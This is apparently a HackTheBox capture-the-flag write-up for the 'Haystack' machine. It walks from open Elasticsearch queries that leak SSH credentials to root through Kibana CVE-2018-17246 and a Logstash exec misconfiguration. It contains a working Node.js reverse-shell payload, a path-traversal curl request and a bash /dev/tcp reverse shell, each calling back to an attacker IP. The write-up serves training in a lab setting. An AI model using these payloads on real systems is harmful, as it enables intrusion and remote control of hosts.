---
title: "Haystack - HackTheBox"
date: 2019-11-02T15:42:05+02:00
tags:
    - "CTF"
    - "HackTheBox"
---

## Information gathering
As always, let's scan the host using nmap:
```
$ nmap -A -T4 10.10.10.115
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-30 17:24 EDT
Nmap scan report for 10.10.10.115
Host is up (0.052s latency).
Not shown: 995 filtered ports
PORT     STATE  SERVICE     VERSION
22/tcp   open   ssh         OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 2a:8d:e2:92:8b:14:b6:3f:e4:2f:3a:47:43:23:8b:2b (RSA)
|   256 e7:5a:3a:97:8e:8e:72:87:69:a3:0d:d1:00:bc:1f:09 (ECDSA)
|_  256 01:d2:59:b2:66:0a:97:49:20:5f:1c:84:eb:81:ed:95 (ED25519)
80/tcp   open   http        nginx 1.12.2
|_http-server-header: nginx/1.12.2
|_http-title: Site doesn't have a title (text/html).
1556/tcp closed veritas_pbx
6101/tcp closed backupexec
9200/tcp open   http        nginx 1.12.2
| http-methods:
|_  Potentially risky methods: DELETE
|_http-server-header: nginx/1.12.2
|_http-title: Site doesn't have a title (application/json; charset=UTF-8).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.50 seconds
```

## Exploration
The web server homepage contains an image:
![Web](/images/hackthebox/haystack/needle.jpg)

As there's nothing in the page's source code, let's download it and inspect it
using `strings`:
```
$ strings needle.jpg
JFIF
Exif
paint.net 4.1.1
...
...
...
BN2I
,'*'
I$f2/<-iy
bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg==
```

It might be `base64`, let's try to decode it:
```
$ echo bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg== | base64 -d
la aguja en el pajar es "clave"
```

Ok, it looks like we have a hint, the translation is:

> The needle in the haystack is "key"

Let's keep it in mind.

## Further exploring
Let's check the second web server. Visiting `http://10.10.10.115:9200` returns
us some `json`:
```json
{
  "name" : "iQEYHgS",
  "cluster_name" : "elasticsearch",
  "cluster_uuid" : "pjrX7V_gSFmJY-DxP4tCQg",
  "version" : {
    "number" : "6.4.2",
    "build_flavor" : "default",
    "build_type" : "rpm",
    "build_hash" : "04711c2",
    "build_date" : "2018-09-26T13:34:09.098244Z",
    "build_snapshot" : false,
    "lucene_version" : "7.4.0",
    "minimum_wire_compatibility_version" : "5.6.0",
    "minimum_index_compatibility_version" : "5.0.0"
  },
  "tagline" : "You Know, for Search"
}
```

It looks like there's an `elasticsearch` instance running on the machine, which
is a search engine.  
Let's see what are the available `indices` (you can see them as tables of a
classic database) by querying `http://10.10.10.115:9200/_cat/indices?v`:
```
health status index   uuid                   pri rep docs.count docs.deleted store.size pri.store.size
green  open   .kibana 6tjAYZrgQ5CwwR0g6VOoRg   1   0          1            0        4kb            4kb
yellow open   quotes  ZG2D1IqkQNiNZmi2HRImnQ   5   1        253            0    262.7kb        262.7kb
yellow open   bank    eSVpNfCfREyYoVigNWcrMw   5   1       1000            0    483.2kb        483.2kb
```

So we have `quotes` and `bank`. As they are both quite big, we can use a
parameter named `q` in our requests to the `_search` endpoint to search for
data.  
After some attempts, I discovered this message on
`http://10.10.10.115:9200/_search?pretty&q=haystack`:
```json
{
  "took" : 29,
  "timed_out" : false,
  "_shards" : {
    "total" : 11,
    "successful" : 11,
    "skipped" : 0,
    "failed" : 0
  },
  "hits" : {
    "total" : 1,
    "max_score" : 5.427053,
    "hits" : [
      {
        "_index" : "quotes",
        "_type" : "quote",
        "_id" : "2",
        "_score" : 5.427053,
        "_source" : {
          "quote" : "There's a needle in this haystack, you have to search for it"
        }
      }
    ]
  }
}
```

This seems to point us towards the previous hint, so let's try to query
`http://10.10.10.115:9200/_search?pretty&q=clave`:
```json
{
  "took" : 26,
  "timed_out" : false,
  "_shards" : {
    "total" : 11,
    "successful" : 11,
    "skipped" : 0,
    "failed" : 0
  },
  "hits" : {
    "total" : 2,
    "max_score" : 5.9335938,
    "hits" : [
      {
        "_index" : "quotes",
        "_type" : "quote",
        "_id" : "45",
        "_score" : 5.9335938,
        "_source" : {
          "quote" : "Tengo que guardar la clave para la maquina: dXNlcjogc2VjdXJpdHkg "
        }
      },
      {
        "_index" : "quotes",
        "_type" : "quote",
        "_id" : "111",
        "_score" : 5.3459888,
        "_source" : {
          "quote" : "Esta clave no se puede perder, la guardo aca: cGFzczogc3BhbmlzaC5pcy5rZXk="
        }
      }
    ]
  }
}
```

Bingo! Let's decode the two strings:
```
$ echo dXNlcjogc2VjdXJpdHkg | base64 -d
user: security
```

And here's the second one:
```
$ echo cGFzczogc3BhbmlzaC5pcy5rZXk= | base64 -d
pass: spanish.is.key
```

Seems like we have a set of credentials! After connecting, let's get the user
flag:
```
[security@haystack ~]$ cat user.txt
04d18bc79dac1d4d48ee0a940c8eb929
```

## Privilege escalation

Usually when there's `elasticsearch` on a server, there's also `kibana` and
`logstash`, hence the name `ELK` stack.

Checking the list of running processes with `ps -Ao user,pid,args -ww`, we
can see that `logstash` is running as `root`, as opposed to its own user.

By making a request to ` http://localhost:5601/api/status` we can see that the
running version of the instance of kibana is `6.4.2` which has a nice `LFI`
vulnerability that can be exploited to get a shell as the user `kibana`. More
details can be found [here](https://github.com/mpgn/CVE-2018-17246).

Let's write this reverse shell in a file and set our IP address and port in the
call to `client.connect`:
```js
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(1337, "10.10.14.8", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();
```

And after setting our netcat listener with `nc -lnvp 1337`, let's make a request
to the vulnerable module to get the reverse shell:
```
$ curl http://127.0.0.1:5601/api/console/api_server?sense_version=@@SENSE_VERSION\&apis=../../../../../../.../../../../tmp/shell.js
```

Ok, now we can check the `logstash` configuration files, starting by
`/etc/logstash/conf.d/filter.conf`:
```
filter {
    if [type] == "execute" {
        grok {
            match => { "message" => "Ejecutar\s*comando\s*:\s+%{GREEDYDATA:comando}" }
        }
    }
}
```
This is `input.conf`:
```
input {
    file {
        path => "/opt/kibana/logstash_*"
        start_position => "beginning"
        sincedb_path => "/dev/null"
        stat_interval => "10 second"
        type => "execute"
        mode => "read"
    }
}
```

And the last one, `output.conf`:
```
output {
    if [type] == "execute" {
        stdout { codec => json }
        exec {
            command => "%{comando} &"
        }
    }
}
```

## Command execution as root
The vulnerability here can be exploited by writing a file in
`/opt/kibana/logstash_*` that contains the string `Ejecutar comando :` followed
by any command that we want to run. Given the misconfiguration of logstash,
the command will be executed as `root`.

Let's write the file that contains the reverse shell connection:
```
echo "Ejecutar comando : bash -i >& /dev/tcp/10.10.14.2/1338 0>&1" > /opt/kibana/logstash_revshell
```

After a couple of seconds we will get our root shell and we can print the flag:
```
[root@haystack /]# cat /root/root.txt
3f5f727c38d9f70e1d2ad2ba11059d92
```
